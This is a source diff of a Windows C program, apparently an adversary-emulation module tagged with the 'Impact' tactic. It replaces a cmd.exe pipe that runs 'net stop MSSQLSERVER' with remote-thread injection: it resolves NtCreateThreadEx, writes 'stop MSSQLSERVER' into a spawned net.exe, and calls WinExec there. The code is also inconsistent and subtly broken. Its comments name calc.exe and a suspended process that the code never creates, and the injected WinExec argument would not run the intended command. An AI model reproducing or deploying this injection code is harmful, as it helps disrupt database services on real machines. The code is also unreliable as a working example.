@@ -4,83 +4,96 @@
 // Tactics   = Impact
 
 #include <windows.h>
-//#include <stdio.h>
+#include <winternl.h>
+#include <stdio.h>
 
-#define RUN(toRun) WriteFile(hStdinWrite, toRun "\r\n", lstrlenA(toRun "\r\n"), &bytesWritten, NULL);
+typedef NTSTATUS(WINAPI* NtCreateThreadExType)(
+    PHANDLE ThreadHandle,
+    ACCESS_MASK DesiredAccess,
+    PVOID ObjectAttributes,
+    HANDLE ProcessHandle,
+    PVOID StartRoutine,
+    PVOID Argument,
+    ULONG CreateFlags,
+    ULONG ZeroBits,
+    ULONG StackSize,
+    ULONG MaximumStackSize,
+    PVOID AttributeList);
 
-SECURITY_ATTRIBUTES sa;
-PROCESS_INFORMATION pi;
 STARTUPINFOA si;
+PROCESS_INFORMATION pi;
+HANDLE hThread;
 
 int main() {
-    HANDLE hStdinWrite, hStdinRead;
-    HANDLE hStdoutWrite, hStdoutRead;
-    char buffer[4096];
-    DWORD bytesRead, bytesWritten;
-
-    // Set security attributes for pipe handles
-    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
-    sa.bInheritHandle = TRUE;
-    sa.lpSecurityDescriptor = NULL;
-
-    // Create pipes for standard input
-    if (!CreatePipe(&hStdinRead, &hStdinWrite, &sa, 0)) {
-        //printf("Failed to create stdin pipe.\n");
-        return 1;
+    // Load NtCreateThreadEx
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    NtCreateThreadExType NtCreateThreadEx = (NtCreateThreadExType)GetProcAddress(ntdll, "NtCreateThreadEx");
+    if (!NtCreateThreadEx) {
+        //printf("Failed to load NtCreateThreadEx\n");
+        return -1;
     }
 
-    // Create pipes for standard output
-    if (!CreatePipe(&hStdoutRead, &hStdoutWrite, &sa, 0)) {
-        //printf("Failed to create stdout pipe.\n");
-        return 1;
-    }
-
-    // Ensure the write handle to stdin and the read handle to stdout are not inherited
-    SetHandleInformation(hStdinWrite, HANDLE_FLAG_INHERIT, 0);
-    SetHandleInformation(hStdoutRead, HANDLE_FLAG_INHERIT, 0);
-
-    // Set up STARTUPINFO to use the pipe handles
-    si.cb = sizeof(si);
-    si.hStdInput = hStdinRead;
-    si.hStdOutput = hStdoutWrite;
-    si.hStdError = hStdoutWrite;
-    si.dwFlags |= STARTF_USESTDHANDLES;
-
-    // Start the cmd.exe process
-    if (!CreateProcessA(
-        NULL,                    // Application name
-        (LPSTR)"cmd.exe",               // Command line
-        NULL,                    // Process handle not inheritable
-        NULL,                    // Thread handle not inheritable
-        TRUE,                    // Set handle inheritance to TRUE
-        0,                       // No creation flags
-        NULL,                    // Use parent's environment block
-        NULL,                    // Use parent's starting directory
-        &si,                     // Pointer to STARTUPINFO structure
-        &pi))                    // Pointer to PROCESS_INFORMATION structure
+    // Step 1: Create a suspended target process (calc.exe)
+    si.cb = sizeof(STARTUPINFOA);
+    if (!CreateProcessA(NULL, (LPSTR)"C:\\Windows\\System32\\net.exe", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
     {
-        //printf("Failed to create cmd.exe process (%d).\n", GetLastError());
-        return 1;
+        //printf("Failed to create process (error %d)\n", GetLastError());
+        return -1;
     }
 
-    // Close unused pipe ends
-    CloseHandle(hStdinRead);
-    CloseHandle(hStdoutWrite);
+    //printf("Created calc.exe process with PID: %d\n", pi.dwProcessId);
 
-    RUN("C:\\Windows\\System32\\net.exe stop MSSQLSERVER");
-
-    // Read the output from cmd.exe
-    while (ReadFile(hStdoutRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
-        buffer[bytesRead] = '\0'; // Null-terminate the buffer
-        //printf("%s", buffer);
+    // Step 2: Allocate memory in the target process
+    const char* cmdArgs = "stop MSSQLSERVER";
+    SIZE_T cmdArgsSize = lstrlenA(cmdArgs) + 1;
+    LPVOID remoteMemory = VirtualAllocEx(pi.hProcess, NULL, cmdArgsSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!remoteMemory) {
+        //printf("Failed to allocate memory in target process (error %d)\n", GetLastError());
+        TerminateProcess(pi.hProcess, 1);
+        return -1;
     }
 
-    // Wait for cmd.exe process to exit
-    WaitForSingleObject(pi.hProcess, INFINITE);
+    // Step 3: Write the command arguments into the allocated memory
+    if (!WriteProcessMemory(pi.hProcess, remoteMemory, cmdArgs, cmdArgsSize, NULL)) {
+        //printf("Failed to write memory in target process (error %d)\n", GetLastError());
+        VirtualFreeEx(pi.hProcess, remoteMemory, 0, MEM_RELEASE);
+        TerminateProcess(pi.hProcess, 1);
+        return -1;
+    }
+
+    HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
+    FARPROC winExec = GetProcAddress(kernel32, "WinExec");
+
+    // Step 4: Use NtCreateThreadEx to create a remote thread in the target process
+    NTSTATUS status = NtCreateThreadEx(
+        &hThread,
+        THREAD_ALL_ACCESS,
+        NULL,
+        pi.hProcess,
+        winExec, // Start routine (WinExec)
+        remoteMemory, // Argument (command line arguments)
+        FALSE,
+        0,
+        0,
+        0,
+        NULL
+    );
+
+    if (status < 0) {
+        //printf("Failed to create remote thread (status 0x%x)\n", status);
+        VirtualFreeEx(pi.hProcess, remoteMemory, 0, MEM_RELEASE);
+        TerminateProcess(pi.hProcess, 1);
+        return -1;
+    }
+
+    //printf("Successfully created remote thread. Resuming main process...\n");
+
+    // Step 5: Resume the main process thread
+    ResumeThread(pi.hThread);
 
     // Clean up
-    CloseHandle(hStdinWrite);
-    CloseHandle(hStdoutRead);
+    WaitForSingleObject(hThread, INFINITE); // Wait for the thread to finish
+    CloseHandle(hThread);
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
 
